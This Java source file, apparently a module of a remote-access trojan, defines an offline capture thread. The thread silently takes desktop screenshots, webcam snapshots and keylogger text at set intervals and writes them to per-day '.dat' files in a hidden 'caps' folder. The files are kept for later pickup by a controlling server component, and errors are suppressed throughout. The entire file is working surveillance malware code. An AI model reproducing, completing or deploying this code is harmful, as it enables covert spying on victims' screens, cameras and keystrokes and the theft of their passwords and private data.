package rt.modulos.var;

import comunes.Captura;
import comunes.Interfaz;
import comunes.PantallaBloque;
import java.io.File;
import java.util.ArrayList;
import java.util.Date;
import rt.Inicio;
import rt.util.IMG;
import rt.util.UtilRT;

//captura offline
public class COFF extends Thread implements Interfaz {

    private File rutaOffline; //carpeta donde se almacenaran los archivos
    private File archivoPantallas; //archivo offline pantallas
    private File archivoCamara; //archivo offline camara
    private File archivoKeylogger; //archivo offline pantallas
    private boolean cooriendoOffline = false;//corriendo offline
    public boolean activo;//activo
    private Interfaz servicio;//servicio
    private Interfaz kl;//interfax keylogger
    private int delayEscritorio;//delay entre captura del escritprio
    private int delayCamara;//delay entre captura de la camara
    private int delayAudio;//delay entre captura del audio del microfono
    private int delayMinimo;//debe haber un minimo de espera, esta variable contendra el valor minimo de espera
    private long capturaAnteriorEscritorio;//captura anterior
    private long capturaAnteriorCamara;//captura camara|
    private boolean copiando = false;//copiando
    private String prefijo;//el prefijo del servidor, se usa para distinguir el archivo de capturas
    //definen la ultima vez q se capturaron
    private long ultimaVezEscritorio;
    private long ultimaVezCam;
    private long ultimaVezAudio;

    @Override
    public void instanciar(Object... parametros) {
        this.servicio = (Interfaz) parametros[0];
        this.delayEscritorio = (Integer) parametros[1];
        this.kl = (Interfaz) parametros[2];
        this.prefijo = (String) parametros[3];
        this.delayCamara = (Integer) parametros[4];
        this.delayAudio = (Integer) parametros[5];
        ultimaVezEscritorio = ultimaVezCam = ultimaVezAudio = System.currentTimeMillis();
    }

    private void iniciar() {
        activo = true;
        setearMinimo();
        start();
    }

    private void detener() {
        try {
            activo = false;
        } catch (Exception e) {
        }
    }

    private synchronized void esperarCopia() {
        while (copiando) {
            try {
//                wait();
                Thread.sleep(200);
            } catch (Exception e) {

            }
        }
    }

    private void agregarCapturaPantalla(Captura captura) {
        esperarCopia();
        UtilRT.agregarObjeto(archivoPantallas.getAbsolutePath(), captura, true, true);
    }

    private void agregarCapturaCamara(Captura captura) {
        esperarCopia();
        UtilRT.agregarObjeto(archivoCamara.getAbsolutePath(), captura, true, true);
    }

    private void capturaEscritorio() {
        try {
            if ((System.currentTimeMillis() - ultimaVezEscritorio) > delayEscritorio) {
                long criterio = 0;
                PantallaBloque bloque;
                Captura captura;
                bloque = new PantallaBloque();
                bloque.setDatos(IMG.getPantallaCompleta());
                criterio = UtilRT.generarChecksum(bloque.getDatos());
                if (criterio != capturaAnteriorEscritorio) {
                    captura = new Captura();
                    captura.setBloques(new ArrayList<PantallaBloque>());
                    captura.getBloques().add(bloque);
                    captura.setFecha(new Date());
                    agregarCapturaPantalla(captura);
                    capturaAnteriorEscritorio = criterio;
                    captura = null;
                }
                bloque = null;
                ultimaVezEscritorio = System.currentTimeMillis();
            }
        } catch (Exception e) {

        }
    }

    private void capturaCamara() {
        try {
            if ((System.currentTimeMillis() - ultimaVezCam) > delayCamara) {
                esperarCopia();//por si acaso se activa la copia despues de pasar el if
                long criterio = 0;
                PantallaBloque bloque;
                Captura captura;
                bloque = new PantallaBloque();
                //abro la camara
                servicio.ejecutar(14);
                //tomo los datos de la imagen
                bloque.setDatos((byte[]) ((Interfaz) servicio.get(13)).get(0));
                //cierro la camara
                servicio.ejecutar(15);
                criterio = UtilRT.generarChecksum(bloque.getDatos());
                if (criterio != capturaAnteriorCamara) {
                    captura = new Captura();
                    captura.setBloques(new ArrayList<PantallaBloque>());
                    captura.getBloques().add(bloque);
                    captura.setFecha(new Date());
                    agregarCapturaCamara(captura);
                    capturaAnteriorCamara = criterio;
                    captura = null;
                }
                bloque = null;
                ultimaVezCam = System.currentTimeMillis();
            }
        } catch (Exception e) {

        }
    }

    private void capturaAudio() {

    }

    private void setearMinimo() {
        delayMinimo = Math.min(delayAudio, Math.min(delayCamara, delayEscritorio));
    }

    private void capturaKeyLogger() {
        try {
            if (kl != null && (Boolean) kl.get(0)) {
                esperarCopia();//por si acaso se activa la copia despues de pasar el if
                UtilRT.agregarTexto(archivoKeylogger, (String) kl.get(1));
                kl.ejecutar(2);//vaciar
            }
        } catch (Exception e) {
        }
    }

    @Override
    public void run() {
        activo = true;
//        setName("hilo-captura offline");
        try {
            rutaOffline = new File(new File(Inicio.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getParent(), "caps");
            rutaOffline.mkdirs();
        } catch (Exception ex) {
        }
        try {
            archivoPantallas = new File(rutaOffline, "cap" + prefijo + UtilRT.nombreDia() + ".dat");
        } catch (Exception ex) {
        }

        try {
            archivoCamara = new File(rutaOffline, "cam" + prefijo + UtilRT.nombreDia() + ".dat");
        } catch (Exception ex) {
        }
        try {
            archivoKeylogger = new File(rutaOffline, "kl" + prefijo + UtilRT.nombreDia() + ".dat");
        } catch (Exception ex) {
        }
        cooriendoOffline = true;

        try {
            this.capturaAnteriorEscritorio = 0;
            while (activo) {
                try {
                    sleep(delayMinimo);
                } catch (Exception ex) {
                }
                esperarCopia();//por si acaso se activa la cpia despues de pasar el if
                if (!copiando) {
                    //capturas de pantallas
                    capturaEscritorio();
                    //captura de camara web
                    capturaCamara();
                    //captura del audio
                    capturaAudio();
                    //captura del keylogger
                    capturaKeyLogger();
                }
            }
        } catch (Exception ex) {

            //servicio.enviarMensaje("Error al realizar captura offline " + ex.getMessage());
            servicio.ejecutar(6, "Error al realizar captura offline " + ex.getMessage());
        }
        activo = false;
    }

    public void set(int opcion, Object valor) {
        switch (opcion) {
            case 1:
                archivoPantallas = ((File) valor);
                break;
            case 2:
                cooriendoOffline = ((Boolean) valor);
                break;
            case 3:
                copiando = (Boolean) valor;
                break;
            case 5:
                archivoKeylogger = ((File) valor);
                break;
        }
    }

    public Object get(int opcion, Object... parametros) {
        switch (opcion) {
            case 1:
                return archivoPantallas;
            case 2:
                return cooriendoOffline;
            case 3:
                return copiando;
            case 4:
                //return UtilRT.leerObjetos(archivoPantallas.getAbsolutePath());
                return UtilRT.contarObjetos(archivoPantallas.getAbsolutePath());
            case 5:
                return archivoKeylogger;
            case 6:
                return rutaOffline;
        }
        return null;
    }

    public void ejecutar(int opcion, Object... parametros) {
        switch (opcion) {
            case 0:
                iniciar();
                break;
            case 1:
                detener();
                break;
        }
    }
}
